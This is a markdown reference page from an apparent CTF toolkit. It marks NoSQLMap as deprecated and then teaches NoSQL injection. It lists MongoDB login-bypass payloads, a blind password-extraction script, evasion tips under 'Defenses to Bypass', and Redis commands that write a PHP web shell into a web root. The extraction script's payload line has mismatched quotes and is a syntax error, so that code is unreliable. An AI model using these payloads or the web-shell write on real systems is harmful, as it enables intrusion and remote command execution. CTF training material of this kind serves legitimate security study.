# CTFTTOU-400 — NoSQLMap (DEPRECATED)

> **Tool ID:** `CTFTTOU-400`  
> **Status:** ⚠️ DEPRECATED - Do Not Use  
> **Related techniques/counters:** CTFTTE-WEB-021, CTFTCTE-WEB-021

## ⚠️ DEPRECATION NOTICE

**This tool is DEPRECATED and should NOT be used in modern CTFs.**

- **Reason:** Python 2.7 only (EOL, no longer maintained)
- **Last Update:** 8+ years ago (abandoned project)
- **Security Risk:** Outdated dependencies with known vulnerabilities
- **Compatibility:** Will not work with Python 3

### Recommended Alternatives

Use these modern, maintained tools instead:

| Tool | Language | Stars | Purpose | Installation |
|------|----------|-------|---------|-------------|
| **nosqlinj** | Python 3 | ~1k | NoSQL injection automation | `git clone https://github.com/IRUSec/nosqlinj` |
| **Custom Python** | Python 3 | N/A | Manual NoSQL injection with pymongo | `pip install pymongo` |
| **MongoDB Tools** | N/A | N/A | MongoDB-specific injection | Use `mongo` shell + injection payloads |
| **PayloadsAllTheThings** | N/A | 5k+ | NoSQL injection payloads | Included in ctf-skills-main |

## Historical Information (For Reference Only)

**Description:**
NoSQLMap was an automated NoSQL database exploitation tool designed to perform injection attacks against MongoDB, CouchDB, Redis, and other NoSQL databases.

**URL:**
<https://github.com/codingo/NoSQLMap>

**Warning:** This repository is **ARCHIVED** and **NOT MAINTAINED**. Last commit was in 2018.

## Why NoSQLMap is Deprecated

1. **Python 2.7 Dependency**
   - Python 2 reached End-of-Life on January 1, 2020
   - No security updates or bug fixes
   - Incompatible with modern systems

2. **Abandoned Project**
   - Last commit: November 2018 (8+ years ago)
   - No active maintainers
   - Unresolved issues and bugs

3. **Security Concerns**
   - Outdated dependencies (requests, pymongo, etc.)
   - Known vulnerabilities in Python 2.7
   - No security patches available

4. **Better Alternatives Exist**
   - Modern tools with active maintenance
   - Better performance and features
   - Python 3 compatible

## Modern NoSQL Injection Techniques

### 1. Manual Testing with MongoDB

**MongoDB Injection:**
```python
import pymongo
import requests

# Example: MongoDB injection via query parameters
# URL: https://example.com/login?username=admin&password=test

# Injection payloads:
injections = [
    "admin' || '1'=='1",
    "admin' || 1==1//",
    '{"$ne": ""}',
    '{"username": "admin", "password": {"$ne": ""}}',
]
```

**Common MongoDB Operators:**
- `$ne` - Not equal
- `$gt` - Greater than
- `$lt` - Less than
- `$regex` - Regular expression
- `$where` - JavaScript evaluation

### 2. Using nosqlinj

**Installation:**
```bash
git clone https://github.com/IRUSec/nosqlinj.git
cd nosqlinj
pip install -r requirements.txt
```

**Usage:**
```bash
# MongoDB injection
python nosqlinj.py -t http://target.com/login -p username,password

# CouchDB injection
python nosqlinj.py -t http://target.com/api -p key,value --couchdb
```

### 3. Burp Suite Extensions

**NoSQLi Scanner Extensions:**
- Install from BApp Store
- Works with Burp Suite Professional

### 4. Custom Payloads from PayloadsAllTheThings

**Location:** `ctf-web/payloads/PayloadsAllTheThings/NoSQL Injection/`

**Quick Reference:**
```bash
# MongoDB
admin' || '1'=='1
admin' || 1==1//
{"username": "admin", "password": {"$ne": ""}}

# CouchDB
"_design" OR "_admin"

# Redis
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET test "<?php system($_GET['cmd']); ?>"
SAVE
```

## NoSQL Injection in CTFs

### Common Challenge Types

1. **MongoDB Login Bypass**
   ```
   Username: admin
   Password: {"$ne": ""}
   ```

2. **MongoDB Blind Injection**
   ```python
   import requests
   
   def check_user(username):
       # True if user exists, False otherwise
       response = requests.post(
           'https://target.com/login',
           json={'username': username, 'password': 'test'}
       )
       return 'Invalid' not in response.text
   
   # Check if admin exists
   print(check_user("admin' && this.password==='test'"))
   ```

3. **CouchDB Authentication Bypass**
   ```
   Username: admin
   Password: {"login":true}
   ```

4. **Redis Serialization Exploits**
   - Use Redis to write web shells
   - Exploit PHP session storage in Redis

### Techniques

1. **Boolean-based Injection**
   - Use logical operators to craft true/false conditions
   - Extract data character by character

2. **Time-based Injection**
   - Use `$where` with sleep() functions
   - Measure response time differences

3. **Error-based Injection**
   - Trigger errors to leak information
   - Use type confusion attacks

4. **Regex Injection**
   - Inject regex patterns
   - Extract data via regex matching

### Defenses to Bypass

1. **Type Checking**
   - Inject arrays/objects instead of strings
   - Use type confusion: `"admin".toString()`

2. **Input Sanitization**
   - Use alternative operators
   - Encode payloads: URL, Base64, Hex

3. **Query Limits**
   - Chain queries efficiently
   - Use aggregation pipeline

## CTF-Specific NoSQL Challenges

### Example: MongoDB CTF Challenge

**Scenario:** Login form with MongoDB backend

**Detection:**
```bash
# Try MongoDB injection
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

**Exploitation:**
```python
import requests
import string

# Blind character extraction
flag = ""
for i in range(1, 50):
    for c in string.printable:
        payload = f'admin'" && this.password[{i}]=="{c}"
        response = requests.post(
            'https://target.com/login',
            json={'username': payload, 'password': 'test'}
        )
        if 'success' in response.text or 'welcome' in response.text:
            flag += c
            print(f"Flag: {flag}")
            break
```

## References

- [NoSQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection)
- [nosqlinj GitHub](https://github.com/IRUSec/nosqlinj)
- [PortSwigger NoSQLi Labs](https://portswigger.net/web-security/nosql)
- [MongoDB Injection Guide](https://book.hacktricks.xyz/pentesting-web/nosql-injection/mongodb-injection)

## Related Techniques

CTFTTE-WEB-021 - NoSQL injection concealment  
CTFTCTE-WEB-021 - NoSQL injection recovery

## Note

For modern CTFs, **use custom Python scripts with pymongo** or **nosqlinj** instead of NoSQLMap. The techniques remain valid, but the original NoSQLMap tool is no longer viable for practical use.
